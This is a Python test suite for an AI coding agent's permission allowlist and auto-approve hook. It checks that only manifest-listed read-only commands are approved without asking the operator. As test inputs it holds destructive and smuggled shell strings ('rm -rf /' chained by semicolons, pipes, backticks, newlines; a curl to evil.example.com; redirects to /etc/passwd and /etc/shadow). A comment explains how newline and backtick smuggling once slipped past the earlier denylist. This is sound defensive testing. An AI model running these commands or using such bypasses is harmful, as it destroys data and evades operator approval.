"""Tests for Task C2 (Cut 1.1 Cluster C / F-78): the settings.json permissions
allowlist + the PreToolUse auto-approve hook (`auto_approve_gate.sh`).

Covers:
  * settings.json's `permissions.allow` carries exactly the manifest's
    allowlist-eligible command prefixes (Bash(<prefix> *) syntax), never a
    hand-drifted second list -- cross-checked against
    command_manifest.allowlist_eligible_prefixes() directly.
  * settings.json's `permissions.ask` covers the live-write shape.
  * The existing self-protect deny rules + disableBypassPermissionsMode are
    unchanged, and the new hook is wired into hooks.PreToolUse alongside
    receipt_gate.sh.
  * auto_approve_gate.sh is enrolled in scaffold_emitter.CLAUDE_CONFIG_SCRIPTS
    so a future bundle cut carries it.
  * Behavioral (subprocess) tests of the real auto_approve_gate.sh script,
    following test_receipt_gate.py's convention: invoke the dev-home script
    with synthetic hook-event JSON on stdin and a temp CLAUDE_PROJECT_DIR
    carrying a real copy of command_manifest.py, and assert the decision.
    Proves the SAFETY INVARIANTS end-to-end:
      - a manifest-eligible read-only command is auto-approved;
      - a live-write-shaped command is never approved;
      - an unrecognized/unmanifested command defers (no decision);
      - the hook fails CLOSED on a missing/malformed manifest, a malformed
        hook event, and a non-Bash tool;
      - a read-only prefix with shell-chained extra commands appended is
        NOT approved (belt-and-suspenders against injection).
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[3]
AUTO_APPROVE_GATE = REPO_ROOT / "wizard" / "templates" / "claude_config" / "auto_approve_gate.sh"
SETTINGS_JSON = REPO_ROOT / "wizard" / "templates" / "claude_config" / "settings.json"
REAL_MANIFEST = (
    REPO_ROOT / "wizard" / "agents" / "lib" / "external_write" / "command_manifest.py"
)

BASH = shutil.which("bash")
HAVE_TOOLS = bool(BASH) and bool(shutil.which("python3"))

sys.path.insert(0, str(REPO_ROOT / "wizard" / "agents" / "lib"))
from external_write import command_manifest as cm  # noqa: E402


# ---------------------------------------------------------------------------
# settings.json content tests
# ---------------------------------------------------------------------------

class SettingsAllowlistTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.settings = json.loads(SETTINGS_JSON.read_text(encoding="utf-8"))

    def test_allow_contains_every_manifest_eligible_prefix(self):
        # Never a hand-drifted second list -- every eligible prefix from the
        # manifest (that is a concrete, literal prefix, i.e. not the
        # templated "<capability>" live-write placeholder) must appear in
        # settings.json's permissions.allow, wrapped in Bash(<prefix> *).
        allow = self.settings["permissions"]["allow"]
        for prefix in cm.allowlist_eligible_prefixes():
            expected = f"Bash({prefix} *)"
            self.assertIn(
                expected, allow,
                f"manifest-eligible prefix {prefix!r} missing from permissions.allow",
            )

    def test_allow_never_contains_the_live_write_prefix(self):
        allow_text = json.dumps(self.settings["permissions"]["allow"])
        live_entry = cm.find_command("bulk-apply --target live")
        self.assertNotIn(live_entry.command_prefix, allow_text)

    def test_allow_entries_are_all_manifest_derived(self):
        # The reverse direction: nothing in permissions.allow references an
        # agents/lib/external_write/*.py script that is NOT manifest-eligible
        # -- i.e. settings.json's allow list is not a superset of the manifest.
        eligible = set(cm.allowlist_eligible_prefixes())
        allow = self.settings["permissions"]["allow"]
        for entry in allow:
            self.assertTrue(entry.startswith("Bash(") and entry.endswith(" *)"),
                             f"unexpected allow entry shape: {entry!r}")
            prefix = entry[len("Bash("):-len(" *)")]
            self.assertIn(prefix, eligible,
                          f"permissions.allow entry {entry!r} is not manifest-eligible")

    def test_ask_covers_the_live_write_shape(self):
        ask = self.settings["permissions"]["ask"]
        self.assertTrue(ask, "permissions.ask must not be empty (live-write must always ask)")
        # bulk-apply --target live must match at least one ask pattern's shape.
        self.assertTrue(
            any("bulk-apply" in entry for entry in ask),
            f"no permissions.ask entry covers bulk-apply: {ask!r}",
        )

    def test_existing_deny_rules_unchanged(self):
        deny = self.settings["permissions"]["deny"]
        for rule in ("Edit(.claude/**)", "Write(.claude/**)",
                     "Edit(.wizard/update-source.json)", "Write(.wizard/update-source.json)",
                     "Edit(.wizard/update-resolution.json)", "Write(.wizard/update-resolution.json)"):
            self.assertIn(rule, deny)

    def test_disable_bypass_permissions_mode_unchanged(self):
        self.assertEqual(
            self.settings["permissions"]["disableBypassPermissionsMode"], "disable"
        )

    def test_receipt_gate_still_wired_in_pretooluse(self):
        hooks_text = json.dumps(self.settings["hooks"]["PreToolUse"])
        self.assertIn("receipt_gate.sh", hooks_text)

    def test_auto_approve_gate_wired_in_pretooluse(self):
        hooks_text = json.dumps(self.settings["hooks"]["PreToolUse"])
        self.assertIn("auto_approve_gate.sh", hooks_text)


class ScaffoldEnrollmentTests(unittest.TestCase):
    def test_auto_approve_gate_enrolled_in_claude_config_scripts(self):
        sys.path.insert(0, str(REPO_ROOT / "wizard" / "scripts" / "lib"))
        import scaffold_emitter  # noqa: E402
        self.assertIn("auto_approve_gate.sh", scaffold_emitter.CLAUDE_CONFIG_SCRIPTS)


# ---------------------------------------------------------------------------
# Behavioral (subprocess) tests of the real auto_approve_gate.sh
# ---------------------------------------------------------------------------

@unittest.skipUnless(HAVE_TOOLS, "bash and/or python3 unavailable")
class AutoApproveGateBehaviorTests(unittest.TestCase):
    """Invoke the real auto_approve_gate.sh as a subprocess with synthetic
    hook JSON, against a temp CLAUDE_PROJECT_DIR carrying a real copy of the
    manifest at the exact path the hook expects it
    (agents/lib/external_write/command_manifest.py -- the same layout the
    manifest ships into per its own module docstring)."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.proj = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def _install_real_manifest(self):
        dest_dir = self.proj / "agents" / "lib" / "external_write"
        dest_dir.mkdir(parents=True, exist_ok=True)
        (dest_dir / "command_manifest.py").write_text(
            REAL_MANIFEST.read_text(encoding="utf-8"), encoding="utf-8"
        )

    def _install_broken_manifest(self, content):
        dest_dir = self.proj / "agents" / "lib" / "external_write"
        dest_dir.mkdir(parents=True, exist_ok=True)
        (dest_dir / "command_manifest.py").write_text(content, encoding="utf-8")

    def _run(self, event):
        env = dict(os.environ)
        env["CLAUDE_PROJECT_DIR"] = str(self.proj)
        res = subprocess.run(
            [BASH, str(AUTO_APPROVE_GATE)],
            input=json.dumps(event),
            capture_output=True,
            text=True,
            env=env,
            timeout=30,
        )
        out = res.stdout.strip()
        decision = None
        if out:
            parsed = json.loads(out)  # any printed output MUST be valid hook JSON
            decision = parsed.get("hookSpecificOutput", {}).get("permissionDecision")
        return res.returncode, decision, out

    # --- positive: a manifest-eligible read-only command is auto-approved --

    def test_eligible_readonly_command_is_allowed(self):
        self._install_real_manifest()
        code, decision, _ = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 agents/lib/external_write/capability_invariants.py"},
        })
        self.assertEqual(code, 0)
        self.assertEqual(decision, "allow",
                          "manifest-eligible read-only command was not auto-approved")

    def test_eligible_readonly_command_with_trailing_args_is_allowed(self):
        self._install_real_manifest()
        code, decision, _ = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 agents/lib/external_write/scan.py --capability gmail"},
        })
        self.assertEqual(code, 0)
        self.assertEqual(decision, "allow")

    def test_all_baseline_eligible_prefixes_are_allowed(self):
        self._install_real_manifest()
        for prefix in cm.allowlist_eligible_prefixes():
            code, decision, _ = self._run({
                "tool_name": "Bash", "tool_input": {"command": prefix},
            })
            self.assertEqual(code, 0)
            self.assertEqual(decision, "allow", f"eligible prefix not allowed: {prefix!r}")

    # --- negative: a live-write command must never be approved ------------

    def test_live_write_shaped_command_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 agents/gmail_capability.py bulk-apply --target live"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "live-write-shaped command was auto-approved")
        self.assertEqual(out, "")

    def test_unmanifested_command_defers(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash", "tool_input": {"command": "ls -la"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "unmanifested command should defer, not be approved")
        self.assertEqual(out, "")

    # --- fail-closed: manifest missing / malformed -------------------------

    def test_missing_manifest_defers_even_for_eligible_looking_command(self):
        # No command_manifest.py installed at all -> the import fails -> defer.
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 agents/lib/external_write/capability_invariants.py"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "missing manifest must defer, never auto-approve")
        self.assertEqual(out, "")

    def test_manifest_that_raises_on_import_defers(self):
        self._install_broken_manifest("raise RuntimeError('manifest is broken')\n")
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 agents/lib/external_write/capability_invariants.py"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "manifest import error must defer, never auto-approve")
        self.assertEqual(out, "")

    def test_manifest_whose_function_raises_defers(self):
        self._install_broken_manifest(
            "def manifest_as_dicts():\n"
            "    raise ValueError('boom')\n"
        )
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 agents/lib/external_write/capability_invariants.py"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "manifest_as_dicts() raising must defer, never auto-approve")
        self.assertEqual(out, "")

    def test_manifest_with_no_eligible_entries_defers(self):
        self._install_broken_manifest(
            "def manifest_as_dicts():\n"
            "    return [{'name': 'x', 'command_prefix': 'python3 x.py', "
            "'class': 'live_write', 'writes_external': True, "
            "'allowed_outputs': [], 'allowlist_eligible': False}]\n"
        )
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {"command": "python3 x.py"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision)
        self.assertEqual(out, "")

    # --- fail-closed: malformed hook event / wrong tool --------------------

    def test_malformed_json_event_defers(self):
        env = dict(os.environ)
        env["CLAUDE_PROJECT_DIR"] = str(self.proj)
        res = subprocess.run(
            [BASH, str(AUTO_APPROVE_GATE)],
            input="{not valid json",
            capture_output=True, text=True, env=env, timeout=30,
        )
        self.assertEqual(res.returncode, 0)
        self.assertEqual(res.stdout.strip(), "", "malformed hook JSON must defer silently")

    def test_non_bash_tool_defers(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Edit",
            "tool_input": {"file_path": "x.md", "old_string": "a", "new_string": "b"},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision)
        self.assertEqual(out, "")

    def test_missing_tool_input_defers(self):
        self._install_real_manifest()
        code, decision, out = self._run({"tool_name": "Bash"})
        self.assertEqual(code, 0)
        self.assertIsNone(decision)
        self.assertEqual(out, "")

    def test_empty_command_defers(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash", "tool_input": {"command": ""},
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision)
        self.assertEqual(out, "")

    # --- belt-and-suspenders: shell chaining must not slip through ---------

    def test_eligible_prefix_with_appended_semicolon_command_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py; rm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "chained command after an eligible prefix must not be approved")
        self.assertEqual(out, "")

    def test_eligible_prefix_with_appended_and_command_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/capability_invariants.py "
                           "&& curl https://evil.example.com"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "&&-chained command must not be approved")
        self.assertEqual(out, "")

    def test_eligible_prefix_with_command_substitution_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py $(rm -rf /)"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "command substitution must not be approved")
        self.assertEqual(out, "")

    # --- smuggling regression: allowlist posture (opus review, Critical) ---
    #
    # The prior denylist (`;|&<>()` token check via shlex) proved
    # non-exhaustive: shlex treats a newline as ordinary whitespace (so a
    # trailing "\n<live command>" tokenizes as if it were just more args of
    # the eligible prefix) and a backtick is not in the denylist at all, so
    # backtick command substitution rode straight through. Both let a live
    # write command run with NO operator prompt. The fix inverts the guard
    # to a conservative safe-char ALLOWLIST checked on the RAW command
    # string, independent of shlex tokenization, so neither vector -- nor
    # any other character outside the safe set -- can slip through.
    #
    # These two are the EXACT payloads the review proved end-to-end.

    def test_SMUGGLE_newline_appended_live_command_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py\nrm -rf /HOME"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(
            decision,
            "CRITICAL REGRESSION: newline-smuggled live command was auto-approved",
        )
        self.assertEqual(out, "")

    def test_SMUGGLE_backtick_command_substitution_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py `rm -rf /tmp/x`"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(
            decision,
            "CRITICAL REGRESSION: backtick-smuggled live command was auto-approved",
        )
        self.assertEqual(out, "")

    # --- allowlist posture: every other unsafe character must also defer --

    def test_carriage_return_appended_command_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py\rrm -rf /HOME"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "carriage-return-smuggled command must not be approved")
        self.assertEqual(out, "")

    def test_dollar_paren_substitution_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py $(id)"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "$() substitution must not be approved")
        self.assertEqual(out, "")

    def test_bare_dollar_variable_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py $HOME"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "bare $VAR expansion must not be approved")
        self.assertEqual(out, "")

    def test_pipe_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py | rm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "piped command must not be approved")
        self.assertEqual(out, "")

    def test_background_ampersand_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py & rm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "backgrounded/chained command must not be approved")
        self.assertEqual(out, "")

    def test_double_ampersand_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py && rm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "&&-chained command must not be approved")
        self.assertEqual(out, "")

    def test_double_pipe_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py || rm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "||-chained command must not be approved")
        self.assertEqual(out, "")

    def test_semicolon_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py ; rm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "semicolon-chained command must not be approved")
        self.assertEqual(out, "")

    def test_redirect_out_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py > /etc/passwd"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "output redirection must not be approved")
        self.assertEqual(out, "")

    def test_redirect_append_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py >> /etc/passwd"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "append redirection must not be approved")
        self.assertEqual(out, "")

    def test_redirect_in_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py < /etc/shadow"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "input redirection must not be approved")
        self.assertEqual(out, "")

    def test_backslash_is_not_allowed(self):
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 agents/lib/external_write/scan.py \\\nrm -rf /"
            },
        })
        self.assertEqual(code, 0)
        self.assertIsNone(decision, "backslash-continuation-smuggled command must not be approved")
        self.assertEqual(out, "")

    # --- happy path must survive the tightened allowlist -------------------

    def test_clean_eligible_command_with_normal_args_still_allowed(self):
        # Confirms the allowlist posture does not over-defer: a genuinely
        # clean read-only invocation with ordinary argument shapes (spaces,
        # '/', '.', '-', '=', ':', '_', digits) must still auto-approve.
        self._install_real_manifest()
        code, decision, out = self._run({
            "tool_name": "Bash",
            "tool_input": {
                "command": (
                    "python3 agents/lib/external_write/scan.py "
                    "--capability gmail_v2 --since=2026-07-01 --limit 10"
                )
            },
        })
        self.assertEqual(code, 0)
        self.assertEqual(
            decision, "allow",
            "a clean eligible command with ordinary args was over-deferred",
        )


if __name__ == "__main__":
    unittest.main()
